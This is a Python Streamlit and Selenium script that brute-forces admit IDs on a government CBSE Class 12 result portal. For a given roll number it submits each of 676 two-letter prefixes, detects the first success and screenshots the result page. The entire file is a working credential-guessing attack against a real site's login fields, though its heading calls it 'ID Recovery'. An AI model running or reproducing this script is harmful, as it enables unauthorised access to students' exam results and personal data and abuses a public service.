import streamlit as st
import os, time, string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,1024") # Larger window to see more
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
    return webdriver.Chrome(options=options)

def check_for_success(driver):
    """Refined logic: Is the user actually looking at a result?"""
    try:
        # 1. If 'No data found' is visible, it's a definite fail.
        err_msg = driver.find_elements(By.ID, "err_msg")
        if err_msg and err_msg[0].is_displayed() and "no data" in err_msg[0].text.lower():
            return False, "Error: No Data Found"

        # 2. Look for the "Marks" table or student name which only appears on success
        page_source = driver.page_source.lower()
        success_keys = ["marks", "statement", "subject", "total", "result:", "candidate", "grade"]
        if any(key in page_source for key in success_keys):
            return True, "Found Success Keywords"

        # 3. Check if we are still on the login page. 
        # If the 'rroll' input is GONE, we probably redirected to the result!
        if len(driver.find_elements(By.ID, "rroll")) == 0:
            return True, "Redirected away from login"

    except:
        pass
    return False, "Still on Login"

# ========================= UI =========================
st.set_page_config(page_title="CBSE Result Brute", layout="wide")
st.title("🔍 CBSE Admit ID Recovery (Debug Edition)")

col1, col2 = st.columns([1, 1])
with col1:
    roll_val = st.text_input("Roll Number", "18615899")
    suffix_val = st.text_input("Admit ID Suffix", "994511")
    delay = st.slider("Wait for result (sec)", 0.5, 5.0, 1.5)

debug_slot = st.empty() # For showing what the browser sees

if st.button("🚀 Start Search"):
    driver = get_driver()
    letters = string.ascii_uppercase
    combos = [f"{a}{b}" for a in letters for b in letters]
    
    try:
        with st.status("Searching...", expanded=True) as status:
            for i, prefix in enumerate(combos):
                full_id = f"{prefix}{suffix_val}"
                status.update(label=f"Testing: {full_id} ({i+1}/676)")
                
                driver.get(URL)
                time.sleep(0.8) # Load time
                
                try:
                    driver.find_element(By.ID, "rroll").send_keys(roll_val)
                    driver.find_element(By.ID, "admn_id").send_keys(full_id)
                    driver.find_element(By.ID, "submit").click()
                    
                    time.sleep(delay)
                    
                    is_hit, reason = check_for_success(driver)
                    
                    if is_hit:
                        st.balloons()
                        st.success(f"🎉 SUCCESS! ID: **{full_id}**")
                        st.info(f"Reason: {reason}")
                        # Take a screenshot so you can see the result!
                        st.image(driver.get_screenshot_as_png(), caption="Result Screen")
                        break
                    
                    # Optional: Every 10 attempts, show the current screen in the debug slot
                    if i % 10 == 0:
                        debug_slot.image(driver.get_screenshot_as_png(), caption=f"Last attempted: {full_id}")

                except Exception as e:
                    continue
    finally:
        driver.quit()
